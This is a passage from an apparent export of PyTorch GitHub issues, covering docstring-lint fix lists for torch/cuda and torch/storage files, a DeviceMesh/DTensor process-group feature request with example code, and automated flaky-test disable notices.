- **File**: `torch/cuda/__init__.py`, **Entity**: `_WrappedTritonKernel`, **Line**: 1144, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/cuda/__init__.py`, **Entity**: `_WrappedTritonKernel`, **Line**: 1144, **Description**: No whitespaces allowed surrounding docstring text
- **File**: `torch/cuda/streams.py`, **Entity**: `wait_event`, **Line**: 38, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/cuda/streams.py`, **Entity**: `wait_stream`, **Line**: 55, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **File**: `torch/cuda/streams.py`, **Entity**: `record_event`, **Line**: 69, **Description**: First line should be in imperative mood (perhaps 'Record', not 'Records')
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: Docstring is over-indented
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 84, **Description**: Section has no content ('Returns')
- **File**: `torch/cuda/streams.py`, **Entity**: `record`, **Line**: 172, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/streams.py`, **Entity**: `record`, **Line**: 172, **Description**: First line should be in imperative mood (perhaps 'Record', not 'Records')
- **File**: `torch/cuda/streams.py`, **Entity**: `wait`, **Line**: 181, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/streams.py`, **Entity**: `wait`, **Line**: 181, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/streams.py`, **Entity**: `wait`, **Line**: 181, **Description**: First line should be in imperative mood (perhaps 'Make', not 'Makes')
- **File**: `torch/cuda/streams.py`, **Entity**: `query`, **Line**: 194, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **File**: `torch/cuda/streams.py`, **Entity**: `elapsed_time`, **Line**: 203, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/streams.py`, **Entity**: `elapsed_time`, **Line**: 203, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/streams.py`, **Entity**: `elapsed_time`, **Line**: 203, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/streams.py`, **Entity**: `synchronize`, **Line**: 209, **Description**: First line should be in imperative mood (perhaps 'Wait', not 'Waits')
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: Multi-line docstring closing quotes should be on a separate line
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: First line should end with a period (not 't')
- **File**: `torch/cuda/streams.py`, **Entity**: `ipc_handle`, **Line**: 220, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/_memory_viz.py`, **Entity**: `segsum`, **Line**: 196, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/_memory_viz.py`, **Entity**: `segsum`, **Line**: 196, **Description**: Use """"""triple double quotes"""""" (found """"""""-quotes)
- **File**: `torch/cuda/_memory_viz.py`, **Entity**: `segsum`, **Line**: 196, **Description**: First line should end with a period (not 's')

cc @carljparker",False
"Fix docstring errors in memory.py, nvtx.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/cuda/memory.py`, **Entity**: `caching_allocator_alloc`, **Line**: 48, **Description**: First line should be in imperative mood (perhaps 'Perform', not 'Performs')
- **File**: `torch/cuda/memory.py`, **Entity**: `caching_allocator_delete`, **Line**: 82, **Description**: First line should be in imperative mood (perhaps 'Delete', not 'Deletes')
- **File**: `torch/cuda/memory.py`, **Entity**: `set_per_process_memory_fraction`, **Line**: 99, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `empty_cache`, **Line**: 126, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `empty_cache`, **Line**: 126, **Description**: First line should end with a period (not 'g')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats`, **Line**: 141, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats`, **Line**: 141, **Description**: First line should end with a period (not 'a')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats`, **Line**: 141, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_stats_as_nested_dict`, **Line**: 242, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_accumulated_memory_stats`, **Line**: 250, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_peak_memory_stats`, **Line**: 270, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_allocated`, **Line**: 289, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_allocated`, **Line**: 289, **Description**: First line should end with a period (not 'y')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_allocated`, **Line**: 289, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_cached`, **Line**: 315, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_cached`, **Line**: 315, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/memory.py`, **Entity**: `reset_max_memory_cached`, **Line**: 315, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_allocated`, **Line**: 341, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_allocated`, **Line**: 341, **Description**: First line should end with a period (not 'n')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_allocated`, **Line**: 341, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_allocated`, **Line**: 359, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_allocated`, **Line**: 359, **Description**: First line should end with a period (not 'n')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_allocated`, **Line**: 359, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_reserved`, **Line**: 381, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_reserved`, **Line**: 381, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_reserved`, **Line**: 381, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_reserved`, **Line**: 397, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_reserved`, **Line**: 397, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_reserved`, **Line**: 397, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_cached`, **Line**: 419, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/cuda/memory.py`, **Entity**: `max_memory_cached`, **Line**: 427, **Description**: First line should be in imperative mood; try rephrasing (found 'Deprecated')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_snapshot`, **Line**: 435, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_summary`, **Line**: 448, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_summary`, **Line**: 448, **Description**: First line should end with a period (not 'r')
- **File**: `torch/cuda/memory.py`, **Entity**: `memory_summary`, **Line**: 448, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/memory.py`, **Entity**: `list_gpu_processes`, **Line**: 573, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `mem_get_info`, **Line**: 607, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `mem_get_info`, **Line**: 607, **Description**: First line should end with a period (not 'n')
- **File**: `torch/cuda/memory.py`, **Entity**: `mem_get_info`, **Line**: 607, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `_record_memory_history`, **Line**: 634, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `_record_memory_history`, **Line**: 634, **Description**: First line should end with a period (not 'y')
- **File**: `torch/cuda/memory.py`, **Entity**: `_record_memory_history`, **Line**: 634, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **File**: `torch/cuda/memory.py`, **Entity**: `get_allocator_backend`, **Line**: 730, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `get_allocator_backend`, **Line**: 730, **Description**: First line should end with a period (not 'y')
- **File**: `torch/cuda/memory.py`, **Entity**: `get_allocator_backend`, **Line**: 730, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/memory.py`, **Entity**: `_CUDAAllocator`, **Line**: 741, **Description**: One-line docstring should fit on one line with quotes (found 2)
- **File**: `torch/cuda/memory.py`, **Entity**: `_CUDAAllocator`, **Line**: 741, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `CUDAPluggableAllocator`, **Line**: 751, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `change_current_allocator`, **Line**: 783, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/memory.py`, **Entity**: `change_current_allocator`, **Line**: 783, **Description**: First line should be in imperative mood (perhaps 'Change', not 'Changes')
- **File**: `torch/cuda/memory.py`, **Entity**: `_get_current_allocator`, **Line**: 796, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_push`, **Line**: 21, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_push`, **Line**: 21, **Description**: First line should end with a period (not 'd')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_pop`, **Line**: 32, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_pop`, **Line**: 32, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_start`, **Line**: 40, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range_start`, **Line**: 40, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range`, **Line**: 78, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/nvtx.py`, **Entity**: `range`, **Line**: 78, **Description**: First line should end with a period (not 'g')

cc @carljparker",False
"Fix docstring errors in graphs.py, storage.py, _sanitizer.py, _utils.py, jiterator.py module: docs triaged medium docathon-h2-2023","Please fix the following issues. To test locally, run: 
 ```
pydocstyle path-to-file --count
```
Run this command before and after fixing the errors. This command prints out the number of errors at the end of the output. Paste the output to your PR description with the number before and after. 
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 124, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 124, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 128, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 128, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 132, **Description**: First line should end with a period (not 'U')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 132, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `mps`, **Line**: 139, **Description**: First line should end with a period (not 'S')
- **File**: `torch/storage.py`, **Entity**: `mps`, **Line**: 139, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `double`, **Line**: 154, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `float`, **Line**: 158, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `half`, **Line**: 162, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `long`, **Line**: 166, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `int`, **Line**: 170, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `short`, **Line**: 174, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `char`, **Line**: 178, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `byte`, **Line**: 182, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bool`, **Line**: 186, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bfloat16`, **Line**: 190, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_double`, **Line**: 194, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_float`, **Line**: 198, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `pin_memory`, **Line**: 214, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/storage.py`, **Entity**: `share_memory_`, **Line**: 230, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 254, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 254, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/storage.py`, **Entity**: `byteswap`, **Line**: 268, **Description**: First line should end with a period (not 'a')
- **File**: `torch/storage.py`, **Entity**: `byteswap`, **Line**: 268, **Description**: First line should be in imperative mood (perhaps 'Swap', not 'Swaps')
- **File**: `torch/storage.py`, **Entity**: `untyped`, **Line**: 609, **Description**: First line should end with a period (not '`')
- **File**: `torch/storage.py`, **Entity**: `untyped`, **Line**: 609, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 806, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `clone`, **Line**: 806, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 811, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `tolist`, **Line**: 811, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 816, **Description**: First line should end with a period (not 'U')
- **File**: `torch/storage.py`, **Entity**: `cpu`, **Line**: 816, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/storage.py`, **Entity**: `pin_memory`, **Line**: 833, **Description**: First line should be in imperative mood (perhaps 'Copy', not 'Copies')
- **File**: `torch/storage.py`, **Entity**: `share_memory_`, **Line**: 845, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 862, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 862, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/storage.py`, **Entity**: `double`, **Line**: 971, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `float`, **Line**: 976, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `half`, **Line**: 981, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `long`, **Line**: 986, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `int`, **Line**: 991, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `short`, **Line**: 996, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `char`, **Line**: 1001, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `byte`, **Line**: 1006, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bool`, **Line**: 1011, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `bfloat16`, **Line**: 1016, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_double`, **Line**: 1021, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `complex_float`, **Line**: 1026, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `from_file`, **Line**: 1032, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `from_file`, **Line**: 1032, **Description**: First line should not be the function's ""signature""
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 1138, **Description**: First line should end with a period (not 'e')
- **File**: `torch/storage.py`, **Entity**: `_new_shared`, **Line**: 1138, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: ``, **Line**: 1, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: ``, **Line**: 1, **Description**: First line should end with a period (not 's')
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: `Access`, **Line**: 53, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: `TensorInfo`, **Line**: 147, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/_sanitizer.py`, **Entity**: `enable_cuda_sanitizer`, **Line**: 609, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **File**: `torch/cuda/_utils.py`, **Entity**: `_get_device_index`, **Line**: 9, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/_utils.py`, **Entity**: `_get_device_index`, **Line**: 9, **Description**: First line should end with a period (not 'e')
- **File**: `torch/cuda/_utils.py`, **Entity**: `_get_device_index`, **Line**: 9, **Description**: First line should be in imperative mood (perhaps 'Get', not 'Gets')
- **File**: `torch/cuda/graphs.py`, **Entity**: `is_current_stream_capturing`, **Line**: 20, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph_pool_handle`, **Line**: 29, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph_pool_handle`, **Line**: 29, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/graphs.py`, **Entity**: `CUDAGraph`, **Line**: 41, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `capture_end`, **Line**: 71, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `capture_end`, **Line**: 71, **Description**: First line should be in imperative mood (perhaps 'End', not 'Ends')
- **File**: `torch/cuda/graphs.py`, **Entity**: `replay`, **Line**: 82, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/graphs.py`, **Entity**: `reset`, **Line**: 88, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/graphs.py`, **Entity**: `reset`, **Line**: 88, **Description**: First line should be in imperative mood (perhaps 'Delete', not 'Deletes')
- **File**: `torch/cuda/graphs.py`, **Entity**: `pool`, **Line**: 94, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `pool`, **Line**: 94, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **File**: `torch/cuda/graphs.py`, **Entity**: `enable_debug_mode`, **Line**: 102, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **File**: `torch/cuda/graphs.py`, **Entity**: `enable_debug_mode`, **Line**: 102, **Description**: First line should be in imperative mood (perhaps 'Enable', not 'Enables')
- **File**: `torch/cuda/graphs.py`, **Entity**: `debug_dump`, **Line**: 108, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `debug_dump`, **Line**: 108, **Description**: First line should end with a period (not '
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph`, **Line**: 119, **Description**: 1 blank line required after class docstring (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph`, **Line**: 119, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `graph`, **Line**: 119, **Description**: First line should end with a period (not '`')
- **File**: `torch/cuda/graphs.py`, **Entity**: `make_graphed_callables`, **Line**: 179, **Description**: 1 blank line required between summary line and description (found 0)
- **File**: `torch/cuda/graphs.py`, **Entity**: `make_graphed_callables`, **Line**: 179, **Description**: First line should end with a period (not ')')
- **File**: `torch/cuda/graphs.py`, **Entity**: `make_graphed_callables`, **Line**: 179, **Description**: First line should be in imperative mood (perhaps 'Accept', not 'Accepts')
- **File**: `torch/cuda/jiterator.py`, **Entity**: `_create_jit_fn`, **Line**: 80, **Description**: No blank lines allowed after function docstring (found 1)
- **File**: `torch/cuda/jiterator.py`, **Entity**: `_create_multi_output_jit_fn`, **Line**: 142, **Description**: No blank lines allowed after function docstring (found 1)

cc @carljparker",False
Get the specified pg dtensor and devicemesh of given the ranks ,"### üöÄ The feature, motivation and pitch

Can torch.devicemesh get the pg of a given ranks like [colossal-AI,](https://github.com/hpcaitech/ColossalAI/blob/8993c8a8170ac116a551840e3d442af78bedc53e/colossalai/cluster/process_group_mesh.py#L134-L149C59) I need to gather dtensor to specify the matrix block of the process,I know torch has **all_gather_tensor** can gather dtensor from **devicemesh dim**, [usage](https://discuss.pytorch.org/t/dtensor-dynamic-gather-local-tensor/191047)
```python
    def get_group(self, ranks_in_group: List[int], backend: Optional[str] = None) -> ProcessGroup:
        """"""Get the process group with the given ranks. It the process group doesn't exist, it will be created.


        Args:
            ranks_in_group (List[int]): Ranks in the process group.
            backend (Optional[str], optional): Backend of the process group. Defaults to None.


        Returns:
            ProcessGroup: The process group with the given ranks.
        """"""
        ranks_in_group = sorted(ranks_in_group)
        if tuple(ranks_in_group) not in self._group_to_ranks:
            group = dist.new_group(ranks_in_group, backend=backend)
            self._ranks_to_group[tuple(ranks_in_group)] = group
            self._group_to_ranks[group] = tuple(ranks_in_group)
        return self._ranks_to_group[tuple(ranks_in_group)]
```
### Alternatives
```python
@spawn_threads_and_init_comms
def collect_dtensor(world_size):
  rank = dist.get_rank()
  x = torch.arange(0,16).reshape(4,4)
  mesh = DeviceMesh(""cpu"", [[0,1],[2,3]],mesh_dim_names=['dp','tp'])
  dx = distribute_tensor(x, mesh,[Shard(0),Shard(1)])
  pg1 = dist.new_group([1,2])
  pg2 = dist.new_group([0,3])
  row_data = funcol.all_gather_tensor(dx.to_local(), gather_dim=1, group=pg1) # error

WORLD_SIZE= 4
collect_dtensor(WORLD_SIZE)

#output ValueError: Invalid type for group, must be one of List, Processgroup, DeviceMesh or (DeviceMesh, int).
```
```python

# correct
import os
import torch
import torch.multiprocessing as mp
import torch.distributed._functional_collectives as funcol
import torch.distributed as dist
from torch.testing._internal.common_distributed import spawn_threads_and_init_comms
from torch.distributed._tensor import DTensor, DeviceMesh, Shard, Replicate, distribute_tensor,zeros
from torch.distributed.distributed_c10d import (
    all_to_all,
    broadcast,
    get_global_rank,
    get_rank,
    get_world_size,
    GroupMember,
    ProcessGroup,
    scatter,
    Work,
)
def run(rank, size):

  rank = dist.get_rank()
  x = torch.arange(0,16).reshape(4,4)
  mesh = DeviceMesh(""cpu"", [[0,1],[2,3]],mesh_dim_names=['dp','tp'])
  dx = distribute_tensor(x, mesh,[Shard(0),Shard(1)])
  pg1 = dist.new_group([1,2])
  pg2 = dist.new_group([0,3])
  if rank in [1,2]:
    row_data = funcol.all_gather_tensor(dx.to_local(), gather_dim=1, group=[1,2])
    print(row_data)
def init_process(rank_id, size, fn, backend='gloo'):
    """""" Initialize the distributed environment. """"""
    os.environ['MASTER_ADDR'] = '127.0.0.1'
    os.environ['MASTER_PORT'] = '12347'
    dist.init_process_group(backend, rank=rank_id, world_size=size)
    fn(rank_id, size)

if __name__ == ""__main__"":
    big_tensor = torch.arange(0,16).reshape(4,4)
    print(big_tensor)
    size = 4
    processes = []
    mp.set_start_method(""spawn"")
    for rank in range(size):
        p = mp.Process(target=init_process, args=(rank, size, run))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
```

_No response_

### Additional context

_No response_
```[tasklist]
### Tasks
```
",False
DISABLED test_dropout_layout_torch_jagged_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_layout_torch_jagged_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18249215223).

Over the past 3 hours, it has been determined flaky in 8 workflow(s) with 24 failures and 8 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_layout_torch_jagged_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int64 (__main__.TestMetaCPU) triaged module: flaky-tests skipped module: primTorch oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int64&suite=TestMetaCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18246954485).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_meta_outplace_nn_functional_margin_ranking_loss_cpu_int64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_meta.py`

cc @ezyang @mruberry @Lezcano @peterbell10 @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
DISABLED test_dropout_layout_torch_jagged_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_dropout_layout_torch_jagged_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18242193791).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_dropout_layout_torch_jagged_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False
